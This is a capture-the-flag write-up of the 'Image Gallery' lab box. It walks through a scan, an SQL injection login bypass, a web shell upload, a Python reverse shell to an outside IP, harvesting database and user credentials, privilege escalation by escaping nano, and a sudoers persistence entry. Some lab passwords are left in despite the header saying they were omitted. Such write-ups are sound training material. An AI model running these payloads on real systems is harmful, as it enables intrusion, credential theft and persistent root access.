## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._


```Description

Try to exploit our image gallery system

```

## IP-Address

```IP

10.49.180.174

```

## Scan

```bash

$ rustscan -a $TARGET -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn -

PORT STATE SERVICE REASON VERSION

22/tcp open ssh syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 3072 d8:ef:cd:8d:fd:26:73:07:eb:68:fa:e4:75:a4:8f:57 (RSA)

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSRmQg3VfPfIYRYhzQloxkWZA1b2eu9IUngqGUwwYKTBqBW+8qj4XyrAn45NCrusqUsaFrsqaVmwkm10ypNXOmldqOeNM/eOB1bebizNGRA8OlWTLUXnA163TzVeCtiybJCw2l5eD62djVy0oN6+3Xm8xvued+GiIWDgeMNkQTVHAzZzFGthsvgnu/CbdwrAIhrclvQ3gg0U/mCt1q0tA90oOebSaOQFzTz8UssWTssaEkMAgp8ONxE002gSfk5GQaSxS0PG6Li0jNr1+7vaMPssqacm7GxBcv6B8vo8HBDjCPmFmwpmHJeNbDore7UInlLkZXSnff6XiHRmq/3mF29wINgdNPnecEzx1hpbY7W5nCkDXgWfZN4cwXYsI3LgDoE+QCZHoy5mvKfX3/ro15PpjY9Gj0wZ6XNgGyzi0NlS/jc/223KYQ+kiLQd2naif1tCDHqA9ogmF2aatSQVj2AhqBFWb1xtIxseiKb3LhO+HtiBpOa/xGwQZFlmOZtbc=

| 256 6b:01:46:19:bd:7c:4d:f5:27:81:9d:f4:f2:12:cb:ff (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPd/qyUgr5CULfQX1tL+NyEqMEJ7a4XisAZpqr3UdQ0fPhUYQncLxYXVEWJ0o68AM35r+9frabowx05FNzVHcos=

| 256 66:16:a2:40:e5:c1:3f:22:15:f2:f2:50:d0:73:f3:b8 (ED25519)

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPsZp57jyRAU5cujYN3Cu7fuSJWdPk1HIOxJFixmTvF

80/tcp open http syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works

|_http-server-header: Apache/2.4.41 (Ubuntu)

| http-methods:

|_ Supported Methods: GET POST OPTIONS HEAD

8080/tcp open http syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))

| http-methods:

|_ Supported Methods: GET HEAD POST OPTIONS

|_http-server-header: Apache/2.4.41 (Ubuntu)

|_http-title: Simple Image Gallery System

| http-cookie-flags:

| /:

| PHPSESSID:

|_ httponly flag not set

|_http-favicon: Unknown favicon MD5: EFBAD535D723EB65399CCE37B78136CD

| http-open-proxy: Potentially OPEN proxy.

|_Methods supported:CONNECTION

```

#### Port 80

- Default Apache2 Page

#### Port 8080

- Gallery Website - Login Page

```html

<!DOCTYPE html>

<html lang="en" class="" style="height: auto;">

<head>

<meta charset="utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Simple Image Gallery System</title>

<link rel="icon" href="http://10.49.180.174/gallery/uploads/gallery.png" />

<!-- Google Font: Source Sans Pro -->

<!-- <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&amp;display=fallback"> -->

<!-- Font Awesome -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/fontawesome-free/css/all.min.css">

<!-- Ionicons -->

<!-- <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> -->

<!-- Tempusdominus Bootstrap 4 -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/tempusdominus-bootstrap-4/css/tempusdominus-bootstrap-4.min.css">

<!-- DataTables -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/datatables-bs4/css/dataTables.bootstrap4.min.css">

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/datatables-responsive/css/responsive.bootstrap4.min.css">

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/datatables-buttons/css/buttons.bootstrap4.min.css">

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/datatables-select/css/select.bootstrap4.min.css">

<!-- Select2 -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/select2/css/select2.min.css">

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/select2-bootstrap4-theme/select2-bootstrap4.min.css">

<!-- iCheck -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/icheck-bootstrap/icheck-bootstrap.min.css">

<!-- JQVMap -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/jqvmap/jqvmap.min.css">

<!-- Theme style -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/dist/css/adminlte.css">

<link rel="stylesheet" href="http://10.49.180.174/gallery/dist/css/custom.css">

<!-- overlayScrollbars -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/overlayScrollbars/css/OverlayScrollbars.min.css">

<!-- Daterange picker -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/daterangepicker/daterangepicker.css">

<!-- summernote -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/summernote/summernote-bs4.min.css">

<!-- SweetAlert2 -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/sweetalert2-theme-bootstrap-4/bootstrap-4.min.css">

<!-- fullCalendar -->

<link rel="stylesheet" href="http://10.49.180.174/gallery/plugins/fullcalendar/main.css">

<style type="text/css">/* Chart.js */

@keyframes chartjs-render-animation{from{opacity:.99}to{opacity:1}}.chartjs-render-monitor{animation:chartjs-render-animation 1ms}.chartjs-size-monitor,.chartjs-size-monitor-expand,.chartjs-size-monitor-shrink{position:absolute;direction:ltr;left:0;top:0;right:0;bottom:0;overflow:hidden;pointer-events:none;visibility:hidden;z-index:-1}.chartjs-size-monitor-expand>div{position:absolute;width:1000000px;height:1000000px;left:0;top:0}.chartjs-size-monitor-shrink>div{position:absolute;width:200%;height:200%;left:0;top:0}

</style>

<!-- jQuery -->

<script src="http://10.49.180.174/gallery/plugins/jquery/jquery.min.js"></script>

<!-- jQuery UI 1.11.4 -->

<script src="http://10.49.180.174/gallery/plugins/jquery-ui/jquery-ui.min.js"></script>

<!-- SweetAlert2 -->

<script src="http://10.49.180.174/gallery/plugins/sweetalert2/sweetalert2.min.js"></script>

<!-- Toastr -->

<script src="http://10.49.180.174/gallery/plugins/toastr/toastr.min.js"></script>

<!-- fullCalendar 2.2.5 -->

<script src="http://10.49.180.174/gallery/plugins/moment/moment.min.js"></script>

<script src="http://10.49.180.174/gallery/plugins/fullcalendar/main.js"></script>

<script>

var _base_url_ = 'http://10.49.180.174/gallery/';

</script>

<script src="http://10.49.180.174/gallery/dist/js/script.js"></script>

</head><body class="hold-transition login-page ">

<script>

start_loader()

</script>

<div class="container mb-4">

<h2 class="text-center">Simple Image Gallery System</h2>

</div>

<div class="login-box">

<!-- /.login-logo -->

<div class="card card-outline card-primary">

<div class="card-header text-center">

<a href="./" class="h1"><b>Login</b></a>

</div>

<div class="card-body">

<form id="login-frm" action="" method="post">

<div class="input-group mb-3">

<input type="text" class="form-control" name="username" placeholder="Username">

<div class="input-group-append">

<div class="input-group-text">

<span class="fas fa-user"></span>

</div>

</div>

</div>

<div class="input-group mb-3">

<input type="password" class="form-control" name="password" placeholder="Password">

<div class="input-group-append">

<div class="input-group-text">

<span class="fas fa-lock"></span>

</div>

</div>

</div>

<div class="row">

<div class="col-8">

</div>

<!-- /.col -->

<div class="col-4">

<button type="submit" class="btn btn-primary btn-block">Sign In</button>

</div>

<!-- /.col -->

</div>

</form>

<!-- /.social-auth-links -->

<!-- <p class="mb-1">

<a href="forgot-password.html">I forgot my password</a>

</p> -->

</div>

<!-- /.card-body -->

</div>

<!-- /.card -->

</div>

<!-- /.login-box -->

<!-- jQuery -->

<script src="plugins/jquery/jquery.min.js"></script>

<!-- Bootstrap 4 -->

<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>

<!-- AdminLTE App -->

<script src="dist/js/adminlte.min.js"></script>

<script>

window.uni_modal = function($title = '' , $url='',$size=""){

start_loader()

$.ajax({

url:$url,

error:err=>{

console.log()

alert("An error occured")

},

success:function(resp){

if(resp){

$('#uni_modal .modal-title').html($title)

$('#uni_modal .modal-body').html(resp)

if($size != ''){

$('#uni_modal .modal-dialog').addClass($size+' modal-dialog-centered')

}else{

$('#uni_modal .modal-dialog').removeAttr("class").addClass("modal-dialog modal-md modal-dialog-centered")

}

$('#uni_modal').modal({

show:true,

backdrop:'static',

keyboard:false,

focus:true

})

end_loader()

}

}

})

}

$(document).ready(function(){

end_loader();

$('#create_account').click(function(){

uni_modal("Create Account","create_account.php")

})

})

</script>

<div class="modal fade" id="uni_modal" role='dialog'>

<div class="modal-dialog modal-md modal-dialog-centered" role="document">

<div class="modal-content">

<div class="modal-header">

<h5 class="modal-title"></h5>

</div>

<div class="modal-body">

</div>

<div class="modal-footer">

<button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save</button>

<button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>

</div>

</div>

</div>

</div>

</body>

</html>

```

- Checking SQL Injection -

```Login

Username - ' OR '1'='1'-- -

Password - [password omitted]
```

- Login bypass

- Gallery access

- Endpoint Discovery

```bash

ffuf -u http://10.49.178.81/FUZZ \

-w /usr/share/seclists/Discovery/Web-Content/common.txt \

-fs 1234

.htpasswd Status: 403

.htaccess Status: 403

.hta Status: 403

gallery Status: 301

index.html Status: 200

server-status Status: 403

$ ffuf -u http://10.49.178.81/gallery/FUZZ \

-w /usr/share/seclists/Discovery/Web-Content/common.txt \

-fs 1234

.htaccess Status: 403

.hta Status: 403

.htpasswd Status: 403

albums Status: 301

archives Status: 301

assets Status: 301

build Status: 301

classes Status: 301

database Status: 301

dist Status: 301

inc Status: 301

index.php Status: 200

plugins Status: 301

report Status: 301

uploads Status: 301

user Status: 301

```

- After Searching over Internet I got the exploit on `Exploit-DB` but it was partially correct and need some change
- Updated code - on My Own `Github` - Gallery.py
- Session Create
```bash
python3 exploit.py
TARGET (e.g. 10.49.178.81 or 10.49.178.81:8080) = 10.49.178.81:8080

[+] Attempting Login Bypass
[DEBUG] Login response: {"status":"success"}
[+] Login bypass SUCCESS
[+] Fetching user info
[+] ID: 1
[+] Username: admin
[+] Uploading shell: shell_xvlyutslnv.php
[DEBUG] Upload response: 1
[+] Upload SUCCESS

[🔥] SHELL URL:
http://10.49.178.81/gallery/uploads/1775692320_shell_xvlyutslnv.php

[+] Testing execution...
[DEBUG] Shell response:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)


[💀] Try manually:
http://10.49.178.81/gallery/uploads/1775692320_shell_xvlyutslnv.php?cmd=whoami

[💣 If not working, try LFI:
http://10.49.178.81:8080/?page=../../uploads/1775692320_shell_xvlyutslnv.php&cmd=id
```
- Session - Browser
```WEB
http://10.49.178.81/gallery/uploads/1775692320_shell_xvlyutslnv.php?cmd=whoami
www-data
```
- Lets take Reverse-shell 
```WEB
http://10.49.178.81/gallery/uploads/1775692320_shell_xvlyutslnv.php?cmd=python3%20-c%20'import%20socket,os,pty;s=socket.socket();s.connect(("192.168.157.252",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
- Got the Reverse
- &  look for `admin` hash
```bash
www-data@ip-10-49-178-81:/var/www/html/gallery$ cat config.php
<?php
ob_start();
ini_set('date.timezone','Asia/Manila');
date_default_timezone_set('Asia/Manila');
session_start();

require_once('initialize.php');
require_once('classes/DBConnection.php');
require_once('classes/SystemSettings.php');
$db = new DBConnection;
$conn = $db->conn;

function redirect($url=''){
	if(!empty($url))
	echo '<script>location.href="'.base_url .$url.'"</script>';
}
function validate_image($file){
	if(!empty($file)){
			return base_url.$file;
			exit;
		if(is_file(base_app.$file)){
			return base_url.$file;
		}else{
			return base_url.'uploads/no-image-available.png';
		}
	}else{
		return base_url.'uploads/no-image-available.png';
	}
}
function isMobileDevice(){
    $aMobileUA = array(
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );


    //Return true if Mobile User Agent is detected
    foreach($aMobileUA as $sMobileKey => $sMobileOS){
        if(preg_match($sMobileKey, $_SERVER['HTTP_USER_AGENT'])){
            return true;
        }
    }
    //Otherwise return false..
    return false;
}
function scan_dir($dir) {
    $ignored = array('.', '..', '.svn', '.htaccess');

    $files = array();
    foreach (scandir($dir) as $file) {
        if (in_array($file, $ignored)) continue;
        $files[$file] = filemtime($dir . '/' . $file);
    }

    arsort($files);
    $files = array_keys($files);

    return ($files) ? $files : false;
}
ob_end_flush();

```
- Got Reference to `/var/www/html/gallery/classes/DBConnection.php`
```bash
cat classes/DBConnection.php
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = DB_SERVER;
    private $username = DB_USERNAME;
    private $password = [password omitted]
    private $database = DB_NAME;

    public $conn;

    public function __construct(){

        if (!isset($this->conn)) {

            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);

            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }
        }

    }
    public function __destruct(){
        $this->conn->close();
    }
}
```
- Got Lead to another File `/var/www/html/gallery/initialize.php`
```bash
$ cat /var/www/html/gallery/initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```
- Got the `DB` credentials
```bash
$ mysql -u gallery_user -p
Enter password: [password omitted]
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 59227
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> USE gallery_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> SHOW TABLES;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.000 sec)

MariaDB [gallery_db]> SELECT * FROM users;
+----+--------------+----------+----------+----------------------------------+-----------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                  | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-----------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1775692320_shell_xvlyutslnv.php | NULL       |    1 | 2021-01-20 14:02:37 | 2026-04-08 23:52:38 |
+----+--------------+----------+----------+----------------------------------+-----------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.000 sec)

MariaDB [gallery_db]>
```
- Got the Admin hash
```hash
[flag/hash omitted]
```
- Search More - Found Mike Backups Files inside `var/backups/`
```bash
$ cd /var/backups/mike_backup/
$ ls -la
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Jul 10  2025 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
$cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```
- Mike Password - `b3stpassw0rdbr0xx`
## Privilege Escalation
#### 
```bash
$ ssh mike@10.48.134.201
b3stpassw0rdbr0xx
mike@ip-10-48-134-201:~$ cat user.txt
[flag omitted]
$ sudo -l
Matching Defaults entries for mike on ip-10-48-134-201:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-48-134-201:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
mike@ip-10-48-134-201:~$ cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
mike@ip-10-48-134-201:~$ ls -la /opt/rootkit.sh\
> ^C
mike@ip-10-48-134-201:~$ ls -la /opt/rootkit.sh
-rw-r--r-- 1 root root 364 May
```
- Exploit 
```bash
sudo /bin/bash /opt/rootkit.sh
read
CTRL + R
CTRL + X
reset; sh 1>&0 2>&0
Enter
```
- Boom Root
```bash
# id
uid=0(root) gid=0(root) groups=0(root)
// I am addming mike as sudoers becuz in nano i cant copy content
$ echo "mike ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/mike
```
- Sudo Mike 
```bash
$ sudo -l
Matching Defaults entries for mike on ip-10-48-134-201:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-48-134-201:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL

mike@ip-10-48-134-201:~$ sudo su
root@ip-10-48-134-201:/home/mike
root@ip-10-48-134-201:/home/mike# cd /root
root@ip-10-48-134-201:~# ls
report.txt  root.txt
root@ip-10-48-134-201:~# cat root.txt
[flag omitted]
```

## Flags
```Flags
User - [flag omitted]
Root - [flag omitted]
```

# END